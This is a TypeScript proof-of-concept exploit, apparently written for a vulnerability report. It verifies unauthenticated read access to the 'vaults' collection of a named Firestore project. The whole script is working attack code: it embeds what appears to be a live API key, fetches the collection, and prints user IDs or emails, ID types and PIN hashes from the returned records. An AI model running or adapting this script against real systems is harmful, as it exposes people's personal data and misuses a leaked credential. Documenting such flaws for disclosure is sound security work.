/**
 * PoC #9: Firestore ACL Bypass & Data Leak Verification
 * 
 * CRITICAL VULNERABILITY VERIFICATION
 * 
 * Verifies that the 'vaults' collection in the 'verified-custody' Firestore database
 * allows unauthenticated read access via the exposed API key.
 * 
 * Target: https://firestore.googleapis.com/v1/projects/verified-custody/databases/(default)/documents/vaults
 */

import https from 'https';

const API_KEY = "AIzaSyC9NftjURlBho082sU7jzkLfI25ChqOUrk";
const PROJECT_ID = "verified-custody";
const URL = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/vaults?key=${API_KEY}`;

function fetchFirestore() {
    console.log("🔍 Testing Firestore Unauthenticated Access...");
    console.log(`Target: ${URL.substring(0, 60)}...`);

    https.get(URL, (res) => {
        console.log(`\nResponse Status: ${res.statusCode} ${res.statusMessage}`);
        
        let data = '';
        res.on('data', (chunk) => data += chunk);
        
        res.on('end', () => {
            if (res.statusCode === 200) {
                console.log("✅ CRITICAL: Firestore Access CONFIRMED!");
                console.log("   Server returned 200 OK with data.\n");
                
                try {
                    const json = JSON.parse(data);
                    if (json.documents) {
                        console.log(`🔓 Documents Exposed: ${json.documents.length}`);
                        console.log("\n--- SAMPLE SENSITIVE DATA ---");
                        
                        // Display first 3 records only
                        json.documents.slice(0, 3).forEach((doc: any, i: number) => {
                            const fields = doc.fields;
                            console.log(`\nRecord #${i + 1}:`);
                            console.log(`  Path: ${doc.name.split('/').pop()}`);
                            
                            if (fields.vaultId) console.log(`  User ID/Email: ${fields.vaultId.stringValue}`);
                            if (fields.idType) console.log(`  ID Type: ${fields.idType.stringValue}`);
                            if (fields.hashedVaultPin) console.log(`  PIN Hash: ${fields.hashedVaultPin.stringValue}`);
                            
                            // Check for shared PIN hash from report
                            if (fields.hashedVaultPin?.stringValue === "0ffe1abd1a08215353c233d6e00961") {
                                console.log(`  ⚠️  MATCHES KNOWN SHARED PIN HASH!`);
                            }
                        });
                        
                        console.log("\n-----------------------------");
                        console.log("⚠️  IMPACT: Full PII exposure (Phone numbers, Emails, Hashes, Metadata)");
                    } else {
                        console.log("⚠️  Access granted but no 'documents' array found (empty collection?)");
                        console.log("Response peek:", data.substring(0, 200));
                    }
                } catch (e: any) {
                    console.error("Error parsing JSON:", e.message);
                }
            } else {
                console.log("❌ Access Denied or Error.");
                console.log("Response peek:", data.substring(0, 200));
            }
        });
    }).on('error', (e) => {
        console.error("Network Error:", e.message);
    });
}

fetchFirestore();
